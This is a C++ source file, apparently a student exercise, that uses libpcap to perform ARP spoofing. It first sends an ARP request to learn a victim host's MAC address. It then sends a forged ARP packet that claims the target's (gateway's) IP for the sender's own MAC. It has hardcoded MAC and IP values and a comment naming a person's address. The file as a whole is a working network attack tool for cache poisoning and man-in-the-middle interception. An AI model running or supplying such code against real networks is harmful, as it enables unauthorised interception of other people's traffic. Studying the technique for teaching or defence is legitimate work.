#include <iostream>
#include <cstring>
#include <pcap/pcap.h>
#include "sender_arp.h"
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

using namespace std;

int main(int argc, char* argv[])
{
    if(argc != 4){
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }



     struct packet{
        struct ethernetheader ethernet1; //not a pointer
        struct arpheader arp1;
         };

    struct packet packet1;
    struct packet spoof;
    struct ethernetheader ethernet; //not a pointer
    struct arpheader arp;




      printf("---ethernet---\n\n");
      getMacAddress(dev, ethernet.shost);
      printf("shost: %02x:%02x:%02x:%02x:%02x:%02x\n\n",
             ethernet.shost[0], ethernet.shost[1], ethernet.shost[2], ethernet.shost[3], ethernet.shost[4], ethernet.shost[5]);

      memset(ethernet.dhost, 0xFFFFFFFFFFFF, 6);
      printf("dhost: %02x:%02x:%02x:%02x:%02x:%02x\n\n",
             ethernet.dhost[0], ethernet.dhost[1], ethernet.dhost[2], ethernet.dhost[3], ethernet.dhost[4], ethernet.dhost[5]);


      ethernet.type[0] = 0x08;
      ethernet.type[1] = 0x06;
      //memset(ethernet->type, 0x0806, 2);
      printf("type: %02u%02u\n\n", ethernet.type[0], ethernet.type[1]);

        printf("---arp---\n\n");
        arp.hdtype[0] = 0;
        arp.hdtype[1] = 1;
      //memset(arp->hdtype, 1, 2);
      printf("hdtype: %02u%02u\n\n", arp.hdtype[0], arp.hdtype[1]);

      arp.prttype[0] = 0x08;
      arp.prttype[1] = 0x00;
      //memset(arp->prttype, 0x0800, 2);
      printf("prttype: %02u%02u\n\n", arp.prttype[0], arp.prttype[1]);


      arp.hdadlen[0] = 0x06;
      //memset(arp->hdadlen, 6, 1);
      printf("hdadlen: %u\n\n", arp.hdadlen[0]);

      arp.prtadlen[0] = 0x04;
      //memset(arp->prtadlen, 4, 1);
      printf("prtadlen: %u\n\n", arp.prtadlen[0]);


      arp.opcode[0] = 0x00;
      arp.opcode[1] = 0x01;
      //memset(arp->opcode, 1, 2);
       printf("opcode: %02u%02u\n\n", arp.opcode[0], arp.opcode[1]);

     //memset(arp->senderHW, 0x005056c00008, 6);
      arp.senderHW[0] = 0x00;
      arp.senderHW[1] = 0x0c;
      arp.senderHW[2] = 0x29;
      arp.senderHW[3] = 0x06;
      arp.senderHW[4] = 0x80;
      arp.senderHW[5] = 0x64;

     printf("sender HW: %02x:%02x:%02x:%02x:%02x:%02x\n\n", arp.senderHW[0], arp.senderHW[1], arp.senderHW[2], arp.senderHW[3], arp.senderHW[4], arp.senderHW[5]);

    uint32_t sender = inet_addr(argv[2]);

    // uint32_t SenderIP = inet_addr(argv[2]);
     uint32_t target = inet_addr(argv[3]);

        u_int8_t myIP[4];

        myIP[0] = 192;
        myIP[1] = 168;
        myIP[2] = 43;
        myIP[3] = 191;
        //{192,168,43,191}; //민정아이피
        memcpy(&arp.senderIP, &myIP, 4);
        memcpy(&arp.targetIP, &sender, 4);



     //memcpy(&arp.senderIP, &myIP, 4);
     printf("sender ip: %u.%u.%u.%u\n\n", arp.senderIP[0], arp.senderIP[1], arp.senderIP[2], arp.senderIP[3]);


     memset(&arp.targetHW, 0x000000000000, 6); //broadcast
    printf("target HW: %02x:%02x:%02x:%02x:%02x:%02x\n\n", arp.targetHW[0], arp.targetHW[1], arp.targetHW[2], arp.targetHW[3], arp.targetHW[4], arp.targetHW[5]);

    // uint32_t target = inet_addr(argv[3]);

    //memcpy(&arp.targetIP, &target, 4);
    printf("target ip: %u.%u.%u.%u\n\n", arp.targetIP[0], arp.targetIP[1], arp.targetIP[2], arp.targetIP[3]);


      /*

      int i=0;
      char *ptr = strtok(argv[2], ".");

      while(ptr != NULL)
      {
          arp->senderIP[i] = atoi(argv[2]);
          ptr = strtok(NULL,".");
          i++;
      }

      */



     if( (ethernet.type[0]*256 + ethernet.type[1]) == 2054){ // 0x0806 == arp protocol

         printf("ethernet destination: %02x:%02x:%02x:%02x:%02x:%02x\n\n",
                ethernet.dhost[0],ethernet.dhost[1],ethernet.dhost[2],ethernet.dhost[3],ethernet.dhost[4],ethernet.dhost[5]);
          printf("ethernet source: %02x:%02x:%02x:%02x:%02x:%02x\n\n",
                ethernet.shost[0],ethernet.shost[1],ethernet.shost[2],ethernet.shost[3],ethernet.shost[4],ethernet.shost[5]);


          printf("--- arp ---\n\n");
          printf("sender HA address: %02x:%02x:%02x:%02x:%02x:%02x\n\n",arp.senderHW[0],arp.senderHW[1],arp.senderHW[2],arp.senderHW[3],arp.senderHW[4],arp.senderHW[5]);
          printf("sender IP: %u.%u.%u.%u\n\n",arp.senderIP[0],arp.senderIP[1],arp.senderIP[2],arp.senderIP[3]);
          printf("target HA address: %02x:%02x:%02x:%02x:%02x:%02x\n\n",arp.targetHW[0],arp.targetHW[1],arp.targetHW[2],arp.targetHW[3],arp.targetHW[4],arp.targetHW[5]);
          printf("target IP: %u.%u.%u.%u\n\n",arp.targetIP[0],arp.targetIP[1],arp.targetIP[2],arp.targetIP[3]);

}
     memcpy(&packet1.ethernet1, &ethernet, 14);
     memcpy(&packet1.arp1, &arp, 28);

    pcap_sendpacket(handle, (uint8_t*)(&packet1), 42);




    struct pcap_pkthdr* header;
    const u_char* reply;
    struct packet packet2;

    while(true){
        int res = pcap_next_ex(handle, &header, &reply);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        memcpy(&packet2.ethernet1, reply, 14);
        memcpy(&packet2.arp1, reply+14, 28);



        if(  (*(int*)(packet2.arp1.senderIP) == sender)  && (packet2.arp1.opcode[1] == 2) ){

            uint8_t neww[6];
            memcpy(neww, packet2.arp1.senderHW, 6);


            // arp spoofing = request after reply

            memcpy(&spoof.ethernet1, &ethernet, 14);
            memcpy(&spoof.arp1, &arp, 28);


            memcpy(&spoof.ethernet1.dhost, neww, 6); // attacker mac

            memcpy(&spoof.arp1.senderIP, &target, 4); // gateway

            pcap_sendpacket(handle, (uint8_t*)(&spoof), 42);



        }


    }




    pcap_close(handle);

    return 0;
}
